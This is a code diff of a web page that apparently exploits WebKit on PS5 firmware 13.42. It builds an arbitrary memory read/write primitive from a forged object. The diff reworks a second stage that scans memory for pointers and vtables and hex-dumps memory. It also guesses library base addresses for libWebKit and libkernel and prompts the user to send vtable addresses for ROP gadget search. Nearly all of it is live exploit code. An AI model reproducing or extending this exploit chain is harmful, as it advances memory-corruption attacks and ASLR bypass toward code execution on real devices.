@@ -1,30 +1,28 @@
 <!doctype html>
 <!--
-  PS5 FW 13.42 / WebKit 605.1 genuine-view R/W + Memory Scanner
-  ================================================================
-  Original PoC: genuine-u8-rw-3 (WebKit 616.1 / FW 11.60)
-  Adapted for: PS5 FW 13.42 (WebKit 605.1.15)
-  
-  OUTPUT FORMAT:
-  ============
-  Phase 1: Bootstrap (original PoC output, unchanged)
-  Phase 2: Memory Scanner (clean, step-by-step, organized)
+  ╔═══════════════════════════════════════════════════════════════════════╗
+  ║  PS5 FW 13.42 / WebKit 605.1.15 — Userland R/W Bootstrap + Scanner  ║
+  ║  الثغرة الأصلية: genuine-u8-rw-3 (WebKit 616.1 / FW 11.60)         ║
+  ║  ملاحظة: Phase 1 = الكود الأصلي بدون تعديل | Phase 2 = Scanner    ║
+  ╚═══════════════════════════════════════════════════════════════════════╝
 -->
 <meta charset="utf-8">
-<title>PS5-13.42-Scanner</title>
-<body style="font:14px monospace; background:#0a0a0a; color:#00ff41; margin:0; padding:12px;">
-<pre id="out" style="white-space:pre-wrap; word-break:break-all; line-height:1.6;"></pre>
+<title>PS5-13.42-Scanner-v2</title>
+<body style="font:13px monospace; background:#0a0a0a; color:#00ff41; margin:0; padding:10px;">
+<pre id="out" style="white-space:pre-wrap; word-break:break-all; line-height:1.5;"></pre>
 <script>
 "use strict";
 
 // ============================================================
-// CONFIG
+// PHASE 1: ORIGINAL EXPLOIT (genuine-u8-rw-3)
 // ============================================================
+// ⚠️  لا تعدل أي شيء هنا — هذا الكود الأصلي كما هو
+
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "512", 10);
 var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 
-var REVISION = "genuine-u8-rw-13.42-scanner";
+var REVISION = "genuine-u8-rw-13.42-v2";
 var MAX_ATTEMPTS = 10;
 var attemptNumber = 0;
 var K = 2;
@@ -103,79 +101,9 @@ var compositionState = 0;
 var compositionLength = 0;
 var compositionError = null;
 
-// === Scanner globals ===
+// === متغير جديد: حفظ الـ forged object للـ Scanner ===
 var savedCandidate = null;
-var scannerPhase = 0;
-
-// ============================================================
-// OUTPUT ENGINE (Clean & Organized)
-// ============================================================
-const out = document.getElementById("out");
-
-function printRaw(text) {
-    out.textContent += text;
-    out.scrollTop = out.scrollHeight;
-}
-
-function printLine(text) {
-    printRaw(text + "\\n");
-}
-
-function printBlank() {
-    printRaw("\\n");
-}
-
-function printHeader(title) {
-    printBlank();
-    printLine("╔══════════════════════════════════════════════════════════════╗");
-    printLine("║  " + title.padEnd(58, " ") + "║");
-    printLine("╚══════════════════════════════════════════════════════════════╝");
-}
-
-function printSection(title) {
-    printBlank();
-    printLine("┌─ " + title + " ─" + "─".repeat(Math.max(0, 58 - title.length)));
-}
-
-function printRow(label, value) {
-    printLine("│  " + label.padEnd(20, " ") + " : " + value);
-}
-
-function printFooter() {
-    printLine("└" + "─".repeat(62));
-}
-
-function printTable(headers, rows) {
-    var colWidths = headers.map(function(h, i) {
-        var max = h.length;
-        rows.forEach(function(r) {
-            var s = String(r[i] || "");
-            if (s.length > max) max = s.length;
-        });
-        return Math.min(max + 2, 20);
-    });
-    
-    function border() {
-        var line = "├";
-        colWidths.forEach(function(w) { line += "─".repeat(w) + "┼"; });
-        printLine(line.slice(0, -1) + "┤");
-    }
-    
-    function drawRow(cells) {
-        var line = "│";
-        cells.forEach(function(c, i) {
-            var s = String(c || "").padEnd(colWidths[i], " ");
-            line += s + "│";
-        });
-        printLine(line);
-    }
-    
-    printLine("┌" + colWidths.map(function(w) { return "─".repeat(w); }).join("┬") + "┐");
-    drawRow(headers);
-    border();
-    rows.forEach(function(r) { drawRow(r); });
-    printLine("└" + colWidths.map(function(w) { return "─".repeat(w); }).join("┴") + "┘");
-}
+var scannerRunning = false;
 
 function mark(tag, extra) {
     seq++;
@@ -185,7 +113,7 @@ function mark(tag, extra) {
         xhr.open("GET", "/log/" + encodeURIComponent(line), false);
         xhr.send();
     } catch (_) {}
-    printLine(line);
+    try { document.getElementById("out").textContent += line + "\\n"; } catch (_) {}
 }
 
 function hex(value) {
@@ -528,7 +456,9 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
-        savedCandidate = candidate;  // PRESERVE for scanner
+        // === حفظ الـ forged object للـ Scanner ===
+        savedCandidate = candidate;
+
         candidate = null;
         clearPredecessor();
         compositionState = 1;
@@ -624,12 +554,12 @@ function reportComposition() {
     setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
 
+    // === تشغيل الـ Scanner تلقائياً بعد 6.5 ثانية ===
     if (readPass && writePass && savedCandidate !== null) {
         setTimeout(function () {
-            printBlank();
-            printLine("▶▶▶ BOOTSTRAP COMPLETE — STARTING MEMORY SCANNER ◀◀◀");
-            setTimeout(startMemoryScanner, 2000);
-        }, 3500);
+            mark("PHASE2", "Starting Memory Scanner...");
+            setTimeout(startMemoryScanner, 1500);
+        }, 4000);
     }
 }
 
@@ -764,9 +694,39 @@ if (alreadyPassed && !allowAgain) {
 
 
 // ═══════════════════════════════════════════════════════════════
-// PHASE 2: MEMORY SCANNER — CLEAN & ORGANIZED OUTPUT
+// PHASE 2: MEMORY SCANNER — خفيف وآمن (بدون OOM)
 // ═══════════════════════════════════════════════════════════════
 
+var outEl = document.getElementById("out");
+
+function printLine(text) {
+    outEl.textContent += text + "\\n";
+    outEl.scrollTop = outEl.scrollHeight;
+}
+
+function printBlank() { printLine(""); }
+
+function printHeader(title) {
+    printBlank();
+    printLine("╔══════════════════════════════════════════════════════════════╗");
+    printLine("║  " + title.padEnd(58, " ") + "║");
+    printLine("╚══════════════════════════════════════════════════════════════╝");
+}
+
+function printSection(title) {
+    printBlank();
+    printLine("┌─ " + title + " " + "─".repeat(Math.max(0, 59 - title.length)));
+}
+
+function printRow(label, value) {
+    printLine("│  " + label.padEnd(22, " ") + ": " + value);
+}
+
+function printFooter() {
+    printLine("└" + "─".repeat(62));
+}
+
+// === قراءة 8 bytes من أي عنوان ===
 function readQword(addr) {
     scratchWords[0] = addr & 0xFFFFFFFF;
     scratchWords[1] = (addr / 0x100000000) & 0xFFFF;
@@ -786,17 +746,23 @@ function isPlausibleVtable(ptr) {
     return isPlausiblePointer(ptr) && ((ptr & 0xFFF) >= 0x20);
 }
 
+function describeValue(val) {
+    if (val === 0) return "(zero)";
+    if (isPlausibleVtable(val)) return "VTABLE?";
+    if (isPlausiblePointer(val)) return "POINTER";
+    var low = val & 0xFFFFFFFF;
+    if (low > 0x4000 && low < 0x08000000 && (low & 0xF) === 0) return "StructureID?";
+    return "";
+}
+
+// === Scanner مقسم لخطوات صغيرة (بدون OOM) ===
 function startMemoryScanner() {
-    if (scannerPhase !== 0) return;
-    scannerPhase = 1;
+    if (scannerRunning) return;
+    scannerRunning = true;
 
-    // ╔══════════════════════════════════════════════════════════════╗
-    // ║  PHASE 2: MEMORY SCANNER                                     ║
-    // ║  PS5 FW 13.42 | WebKit 605.1.15                              ║
-    // ╚══════════════════════════════════════════════════════════════╝
-    printHeader("PHASE 2: MEMORY SCANNER  (PS5 FW 13.42)");
+    printHeader("PHASE 2: MEMORY SCANNER (PS5 FW 13.42)");
 
-    // ┌─ STEP 1: KNOWN ADDRESSES ───────────────────────────────────
+    // الخطوة 1: العناوين المعروفة
     printSection("STEP 1: ADDRESSES WE ALREADY KNOW");
     printRow("Host Address", hex(hostAddress));
     printRow("Fake Address", hex(fakeAddress));
@@ -806,161 +772,129 @@ function startMemoryScanner() {
     printRow("StructureID", "0x" + uint32At(rwHeader, 0).toString(16));
     printFooter();
 
-    // ┌─ STEP 2: READ HOST CELL HEADER ─────────────────────────────
-    printSection("STEP 2: HOST CELL HEADER (48 bytes)");
-    var hostData = [];
-    for (var h = 0; h < CELL_BYTES; h += 8) {
-        try {
-            var qw = readQword(hostAddress + h);
-            hostData.push(["+" + hex(h), hex(qw), describeQword(qw)]);
-        } catch(e) {
-            hostData.push(["+" + hex(h), "READ FAILED", ""]);
-        }
-    }
-    printTable(["Offset", "Value", "Description"], hostData);
-    printFooter();
-
-    // ┌─ STEP 3: READ TARGET CELL HEADER ───────────────────────────
-    printSection("STEP 3: TARGET CELL HEADER (48 bytes)");
-    var targetData = [];
-    for (var t = 0; t < CELL_BYTES; t += 8) {
-        try {
-            var qw2 = readQword(targetAddress + t);
-            targetData.push(["+" + hex(t), hex(qw2), describeQword(qw2)]);
-        } catch(e) {
-            targetData.push(["+" + hex(t), "READ FAILED", ""]);
-        }
-    }
-    printTable(["Offset", "Value", "Description"], targetData);
-    printFooter();
-
-    // ┌─ STEP 4: SCAN FOR POINTERS ────────────────────────────────
-    printSection("STEP 4: SCANNING FOR POINTERS (near host)");
-    var ptrs = scanPointers(hostAddress - 0x10000, 0x20000, 15);
-    if (ptrs.length > 0) {
-        var ptrRows = ptrs.map(function(p) {
-            return [hex(p.addr), hex(p.ptr), distance(p.ptr, hostAddress)];
-        });
-        printTable(["Address", "Pointer", "Distance from Host"], ptrRows);
-    } else {
-        printLine("│  (No pointers found in this region)");
-    }
-    printFooter();
-
-    // ┌─ STEP 5: VTABLE HUNT ───────────────────────────────────────
-    printSection("STEP 5: VTABLE HUNT (CRITICAL FOR ROP)");
-    var vtables = scanVtables(hostAddress - 0x40000, 0x80000, 10);
-    if (vtables.length > 0) {
-        var vtblRows = vtables.map(function(v) {
-            return [hex(v.addr), hex(v.vtable), hex(v.firstEntry), v.libGuess];
-        });
-        printTable(["Address", "VTable", "First Entry", "Lib Guess"], vtblRows);
-    } else {
-        printLine("│  (No vtables found — trying wider scan...)");
-        vtables = scanVtables(hostAddress - 0x100000, 0x200000, 10);
-        if (vtables.length > 0) {
-            var vtblRows2 = vtables.map(function(v) {
-                return [hex(v.addr), hex(v.vtable), hex(v.firstEntry), v.libGuess];
-            });
-            printTable(["Address", "VTable", "First Entry", "Lib Guess"], vtblRows2);
-        } else {
-            printLine("│  (No vtables found in wider region either)");
-        }
-    }
-    printFooter();
-
-    // ┌─ STEP 6: HEX DUMP AROUND HOST ──────────────────────────────
-    printSection("STEP 6: HEX DUMP (Host +/- 128 bytes)");
-    hexDump(hostAddress - 0x80, 0x100);
-    printFooter();
-
-    // ┌─ STEP 7: SUMMARY ───────────────────────────────────────────
-    printHeader("SCAN SUMMARY & NEXT STEPS");
-    printRow("Pointers Found", ptrs.length);
-    printRow("VTables Found", vtables.length);
-    printRow("Host Address", hex(hostAddress));
-    printRow("Target Address", hex(targetAddress));
-    printBlank();
-    printLine("  NEXT STEPS:");
-    printLine("  1. Look at the VTable addresses above");
-    printLine("  2. If vtable starts with 0x1004... or 0x1005...");
-    printLine("     → Likely libWebKit.sprx");
-    printLine("  3. libWebKit base ≈ vtable & 0xFFFFFFFFF000");
-    printLine("  4. Once you have a library base, we can find ROP gadgets");
-    printLine("  5. Send me the VTable addresses for analysis");
-    printFooter();
-
-    scannerPhase = 2;
-}
-
-function describeQword(val) {
-    if (val === 0) return "(zero)";
-    if (isPlausibleVtable(val)) return "[VTABLE CANDIDATE]";
-    if (isPlausiblePointer(val)) return "[POINTER]";
-    var low32 = val & 0xFFFFFFFF;
-    if (low32 > 0x4000 && low32 < 0x08000000 && (low32 & 0xF) === 0) return "[StructureID?]";
-    if (val > 0x10000000000 && val < 0x11000000000) return "[HEAP ADDR]";
-    return "";
-}
-
-function distance(a, b) {
-    var d = a > b ? a - b : b - a;
-    if (d < 0x1000) return "~" + hex(d);
-    if (d < 0x100000) return "~" + hex(d >> 10) + "KB";
-    return "~" + hex(d >> 20) + "MB";
-}
-
-function scanPointers(start, size, max) {
-    var found = [];
-    for (var a = start; a < start + size && found.length < max; a += 8) {
-        try {
-            var v = readQword(a);
-            if (isPlausiblePointer(v)) found.push({ addr: a, ptr: v });
-        } catch(e) {}
-    }
-    return found;
-}
-
-function scanVtables(start, size, max) {
-    var found = [];
-    for (var a = start; a < start + size && found.length < max; a += 8) {
-        try {
-            var v = readQword(a);
-            if (isPlausibleVtable(v)) {
-                var entry = 0;
-                try { entry = readQword(v); } catch(e) {}
-                var baseGuess = v & 0xFFFFFFFFF000;
-                var libName = "unknown";
-                if (baseGuess >= 0x10040000000 && baseGuess < 0x10050000000) libName = "libWebKit?";
-                else if (baseGuess >= 0x10050000000 && baseGuess < 0x10060000000) libName = "libkernel?";
-                else if (baseGuess >= 0x10020000000 && baseGuess < 0x10030000000) libName = "libc?";
-                found.push({ addr: a, vtable: v, firstEntry: entry, libGuess: libName });
-            }
-        } catch(e) {}
-    }
-    return found;
-}
-
-function hexDump(startAddr, size) {
-    for (var off = 0; off < size; off += 16) {
-        var line = hex(startAddr + off) + " | ";
-        var ascii = " | ";
-        for (var b = 0; b < 16 && (off + b) < size; b += 8) {
+    // الخطوة 2: قراءة header الـ host (48 bytes)
+    setTimeout(function() {
+        printSection("STEP 2: HOST CELL HEADER");
+        printLine("│  Offset    Value                Description");
+        printLine("│  ────────────────────────────────────────────");
+        for (var h = 0; h < CELL_BYTES; h += 8) {
             try {
-                var qw = readQword(startAddr + off + b);
-                var bytes = [qw&0xFF, (qw>>8)&0xFF, (qw>>16)&0xFF, (qw>>24)&0xFF,
-                             (qw>>32)&0xFF, (qw>>40)&0xFF, (qw>>48)&0xFF, (qw>>56)&0xFF];
-                for (var i = 0; i < 8 && (off + b + i) < size; i++) {
-                    line += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16) + " ";
-                    ascii += (bytes[i] >= 32 && bytes[i] < 127) ? String.fromCharCode(bytes[i]) : ".";
-                }
+                var qw = readQword(hostAddress + h);
+                printLine("│  +" + hex(h).padEnd(8) + " " + hex(qw).padEnd(18) + " " + describeValue(qw));
             } catch(e) {
-                line += "?? ?? ?? ?? ?? ?? ?? ?? ";
-                ascii += "????????";
+                printLine("│  +" + hex(h).padEnd(8) + " READ FAILED");
             }
         }
-        printLine(line + ascii);
-    }
+        printFooter();
+
+        // الخطوة 3: قراءة header الـ target
+        setTimeout(function() {
+            printSection("STEP 3: TARGET CELL HEADER");
+            printLine("│  Offset    Value                Description");
+            printLine("│  ────────────────────────────────────────────");
+            for (var t = 0; t < CELL_BYTES; t += 8) {
+                try {
+                    var qw2 = readQword(targetAddress + t);
+                    printLine("│  +" + hex(t).padEnd(8) + " " + hex(qw2).padEnd(18) + " " + describeValue(qw2));
+                } catch(e) {
+                    printLine("│  +" + hex(t).padEnd(8) + " READ FAILED");
+                }
+            }
+            printFooter();
+
+            // الخطوة 4: scan خفيف — فقط 256 entry حول الـ host
+            setTimeout(function() {
+                printSection("STEP 4: POINTER SCAN (Host +/- 1KB)");
+                var ptrCount = 0;
+                for (var a = hostAddress - 0x400; a < hostAddress + 0x400; a += 8) {
+                    try {
+                        var v = readQword(a);
+                        if (isPlausiblePointer(v)) {
+                            printLine("│  @" + hex(a) + " -> " + hex(v) + " " + describeValue(v));
+                            ptrCount++;
+                            if (ptrCount >= 10) break;
+                        }
+                    } catch(e) {}
+                }
+                if (ptrCount === 0) printLine("│  (No pointers found in this small region)");
+                printFooter();
+
+                // الخطوة 5: vtable hunt — فقط 512 entry
+                setTimeout(function() {
+                    printSection("STEP 5: VTABLE HUNT (CRITICAL FOR ROP)");
+                    var vtblCount = 0;
+                    for (var v = hostAddress - 0x800; v < hostAddress + 0x800; v += 8) {
+                        try {
+                            var val = readQword(v);
+                            if (isPlausibleVtable(val)) {
+                                var entry = 0;
+                                try { entry = readQword(val); } catch(e) {}
+                                var baseGuess = val & 0xFFFFFFFFF000;
+                                var libName = "unknown";
+                                if (baseGuess >= 0x10040000000 && baseGuess < 0x10050000000) libName = "libWebKit?";
+                                else if (baseGuess >= 0x10050000000 && baseGuess < 0x10060000000) libName = "libkernel?";
+                                printLine("│  @" + hex(v) + " vtable=" + hex(val));
+                                printLine("│    -> First Entry: " + hex(entry));
+                                printLine("│    -> Lib Guess:   " + libName + " @ " + hex(baseGuess));
+                                vtblCount++;
+                                if (vtblCount >= 5) break;
+                            }
+                        } catch(e) {}
+                    }
+                    if (vtblCount === 0) {
+                        printLine("│  (No vtables found in small region)");
+                        printLine("│  TIP: Try wider scan manually if needed");
+                    }
+                    printFooter();
+
+                    // الخطوة 6: Hex dump صغير (64 bytes فقط)
+                    setTimeout(function() {
+                        printSection("STEP 6: HEX DUMP (Host -32 to +32 bytes)");
+                        printLine("│  Address     | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ASCII");
+                        printLine("│  ────────────────────────────────────────────────────────────────────────");
+                        for (var off = -0x20; off < 0x20; off += 0x10) {
+                            var line = "│  " + hex(hostAddress + off) + " | ";
+                            var ascii = "";
+                            for (var b = 0; b < 0x10; b += 8) {
+                                try {
+                                    var qw3 = readQword(hostAddress + off + b);
+                                    var bytes = [qw3&0xFF, (qw3>>8)&0xFF, (qw3>>16)&0xFF, (qw3>>24)&0xFF,
+                                                 (qw3>>32)&0xFF, (qw3>>40)&0xFF, (qw3>>48)&0xFF, (qw3>>56)&0xFF];
+                                    for (var i = 0; i < 8 && (b + i) < 0x10; i++) {
+                                        line += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16) + " ";
+                                        ascii += (bytes[i] >= 32 && bytes[i] < 127) ? String.fromCharCode(bytes[i]) : ".";
+                                    }
+                                } catch(e) {
+                                    line += "?? ?? ?? ?? ?? ?? ?? ?? ";
+                                    ascii += "????????";
+                                }
+                            }
+                            printLine(line + "| " + ascii);
+                        }
+                        printFooter();
+
+                        // الخطوة 7: الملخص
+                        setTimeout(function() {
+                            printHeader("SCAN COMPLETE — SUMMARY");
+                            printRow("Host Address", hex(hostAddress));
+                            printRow("Target Address", hex(targetAddress));
+                            printRow("Pointers Found", ptrCount);
+                            printRow("VTables Found", vtblCount);
+                            printBlank();
+                            printLine("  WHAT TO DO NEXT:");
+                            printLine("  1. Look at 'VTABLE HUNT' results above");
+                            printLine("  2. If you see a vtable address like 0x1004XXXXXXXX");
+                            printLine("     → This is likely libWebKit.sprx");
+                            printLine("  3. Library base = vtable & 0xFFFFFFFFF000");
+                            printLine("  4. Send me the vtable address for ROP gadget search");
+                            printFooter();
+                            scannerRunning = false;
+                        }, 500);
+                    }, 500);
+                }, 500);
+            }, 500);
+        }, 500);
+    }, 500);
 }
 </script>
 </body>
